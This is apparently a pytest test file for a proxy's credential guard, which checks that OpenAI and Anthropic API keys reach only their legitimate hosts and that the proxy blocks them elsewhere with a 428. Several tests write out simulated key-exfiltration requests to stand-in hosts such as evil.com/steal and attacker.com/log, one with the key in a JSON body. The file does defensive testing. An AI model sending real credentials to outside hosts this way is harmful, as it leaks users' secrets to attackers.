"""
Black box tests for credential guard.

These tests verify that:
1. API keys are only sent to their authorized destinations
2. Blocked requests do NOT leak credentials to the sinkhole
3. Legitimate requests pass through with credentials intact
"""

import pytest
from conftest import TEST_ANTHROPIC_KEY, TEST_OPENAI_KEY


class TestCredentialRouting:
    """Credentials reach only their authorised destinations.

    Why: An agent with a real OpenAI/Anthropic/GitHub key should be
    able to use it against the legitimate provider, but nothing else.
    If the credential guard lets a request with a live token reach
    an unrelated host, an attacker-in-the-agent can exfiltrate the
    credential itself (by observing the token in their own logs).
    """

    def test_openai_key_to_openai_allowed(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
        """OpenAI bearer token passes through to api.openai.com.

        What: POST to api.openai.com with a test OpenAI key in the
        Authorization header; assert 200 and the sinkhole received
        the request with the Authorization header intact.
        Why: Confirms the positive path — a legitimate use of an
        OpenAI key actually works. Without this assertion, an overly
        strict credential guard could break the primary workflow.
        """
        response = proxy_client.post(
            "https://api.openai.com/v1/chat/completions",
            headers={"Authorization": f"Bearer {TEST_OPENAI_KEY}"},
            json={"model": "gpt-4", "messages": []},
        )

        # Request should succeed (sinkhole returns 200)
        assert response.status_code == 200, f"Expected 200, got {response.status_code}: {response.text}"

        # Verify sinkhole received the request WITH credentials
        requests = sinkhole.get_requests(host="api.openai.com")
        assert len(requests) == 1, f"Expected 1 request, got {len(requests)}"

        # Check Authorization header is present (case-insensitive)
        headers_lower = {k.lower(): v for k, v in requests[0].headers.items()}
        assert "authorization" in headers_lower, f"Authorization header missing. Headers: {list(requests[0].headers.keys())}"
        assert headers_lower["authorization"].startswith("Bearer sk-"), "Credential not forwarded correctly"

    def test_openai_key_to_evil_blocked(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
        """OpenAI key sent to evil.com is blocked before leaving the proxy.

        What: POST to evil.com with an OpenAI bearer token; assert
        428 (approval required) and the sinkhole received zero
        requests on evil.com.
        Why: A leaked key reaching attacker-controlled infrastructure
        is the core threat credential_guard defends against. This is
        the primary exfiltration vector — a compromised agent posting
        the user's key to any host it can reach.
        """
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": f"Bearer {TEST_OPENAI_KEY}"},
            json={"data": "secret"},
        )

        # Request should be blocked (428 requires approval)
        assert response.status_code == 428, f"Expected 428, got {response.status_code}: {response.text}"

        # CRITICAL: Sinkhole should NOT receive ANY request
        requests = sinkhole.get_requests(host="evil.com")
        assert len(requests) == 0, f"Credential leaked to evil.com! Got {len(requests)} requests"

    def test_anthropic_key_to_anthropic_allowed(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
        """Anthropic x-api-key passes through to api.anthropic.com.

        What: POST to api.anthropic.com with a test Anthropic key in
        x-api-key; assert 200 and the sinkhole received the request
        with the x-api-key header preserved.
        Why: Confirms Anthropic's non-Bearer header is recognised as
        a valid credential route — different header scheme from
        OpenAI, so credential_guard must support both.
        """
        response = proxy_client.post(
            "https://api.anthropic.com/v1/messages",
            headers={
                "x-api-key": TEST_ANTHROPIC_KEY,
                "anthropic-version": "2023-06-01",
            },
            json={"model": "claude-3-opus-20240229", "messages": [], "max_tokens": 100},
        )

        assert response.status_code == 200, f"Expected 200, got {response.status_code}: {response.text}"

        requests = sinkhole.get_requests(host="api.anthropic.com")
        assert len(requests) == 1, f"Expected 1 request, got {len(requests)}"

        # Check x-api-key header is present (case-insensitive)
        headers_lower = {k.lower(): v for k, v in requests[0].headers.items()}
        assert "x-api-key" in headers_lower, f"x-api-key header missing. Headers: {list(requests[0].headers.keys())}"

    def test_anthropic_key_to_attacker_blocked(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
        """Anthropic key sent to attacker.com is blocked.

        What: POST to attacker.com with an Anthropic x-api-key;
        assert 428 and sinkhole saw zero requests on attacker.com.
        Why: Symmetric to the OpenAI case — confirms both credential
        formats are scoped to their legitimate hosts.
        """
        response = proxy_client.post(
            "https://attacker.com/log",
            headers={"x-api-key": TEST_ANTHROPIC_KEY},
            json={"stolen": True},
        )

        assert response.status_code == 428, f"Expected 428, got {response.status_code}: {response.text}"

        # Verify no leak
        requests = sinkhole.get_requests(host="attacker.com")
        assert len(requests) == 0, f"Credential leaked to attacker.com! Got {len(requests)} requests"

    def test_no_credentials_passes_through(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
        """Requests without credentials are not blocked by credential_guard.

        What: GET httpbin.org/get with no Authorization headers;
        assert 200 and sinkhole saw the request.
        Why: credential_guard only triggers on credential presence.
        A broken implementation that blocks any request to a
        non-allowlisted host would be network_guard's job, not this
        addon's — confirm the boundaries are respected.
        """
        response = proxy_client.get("https://httpbin.org/get")

        assert response.status_code == 200, f"Expected 200, got {response.status_code}: {response.text}"

        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1, f"Expected 1 request, got {len(requests)}"


class TestCredentialInBody:
    """Credentials embedded in request bodies are blocked.

    Why: Agents can put credentials in JSON/form bodies, not just
    headers. If the guard only scans headers, an attacker can put
    a stolen key in the request body and exfiltrate through any
    endpoint that accepts POST data. The body-scanning path exists
    behind credguard_scan_bodies=true but isn't wired up yet.
    """

    @pytest.mark.skip(reason="credguard_scan_bodies not yet implemented - option exists but code path missing")
    def test_key_in_json_body_blocked(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
        """OpenAI key in a JSON body is blocked when body scanning is on.

        What: POST to evil.com with the OpenAI test key inside a JSON
        body (not in headers); assert 428/403 and no leak to sinkhole.
        Why: Closes the header-only evasion — without body scanning,
        `{"api_key": "sk-..."}` to an arbitrary host is a straight
        exfil path. Requires credguard_scan_bodies=true, which is
        not yet default.
        """
        response = proxy_client.post(
            "https://evil.com/webhook",
            json={
                "config": {
                    "api_key": TEST_OPENAI_KEY,
                    "endpoint": "https://api.openai.com",
                }
            },
        )

        # Should be blocked (403 or 428)
        assert response.status_code in (403, 428), f"Expected 403 or 428, got {response.status_code}: {response.text}"

        # Verify no leak
        requests = sinkhole.get_requests(host="evil.com")
        assert len(requests) == 0, f"Credential in body leaked to evil.com! Got {len(requests)} requests"


class TestBlockResponseContent:
    """Block responses carry diagnostic data for humans and agents.

    Why: When a request is blocked, the agent needs enough information
    in the response to understand what happened — and the operator
    needs an audit identifier to correlate with logs. A bare 428 with
    no body makes both roles fly blind.
    """

    def test_block_response_includes_event_id(self, proxy_client, wait_for_safeyolo):
        """Block response body contains event_id or request_id.

        What: Trigger a block by sending an OpenAI key to evil.com,
        parse the 428 body as JSON, assert either 'event_id' or
        'request_id' is present.
        Why: The ID lets the operator run `safeyolo explain <id>` to
        see the full decision chain. Without it, block diagnostics
        have to be matched to logs by timestamp — fragile and slow.
        """
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": f"Bearer {TEST_OPENAI_KEY}"},
        )

        assert response.status_code == 428

        # Response should include event_id or request_id for correlation
        data = response.json()
        has_id = "event_id" in data or "request_id" in data
        assert has_id, f"No event ID in response: {data}"

    def test_block_response_indicates_approval_required(self, proxy_client, wait_for_safeyolo):
        """Block response body mentions 'approval' or 'prompt'.

        What: Trigger a block; assert the lowercased response body
        contains 'approval' or 'prompt'.
        Why: The agent reads the block response to decide whether to
        surface an approval UX to the user or just fail. Without a
        clear signal in the body, agents default to treating 428 as
        a permanent failure.
        """
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": f"Bearer {TEST_OPENAI_KEY}"},
        )

        assert response.status_code == 428
        data = response.json()

        # Should indicate this needs approval
        response_text = str(data).lower()
        assert "approval" in response_text or "prompt" in response_text, f"Response doesn't indicate approval needed: {data}"
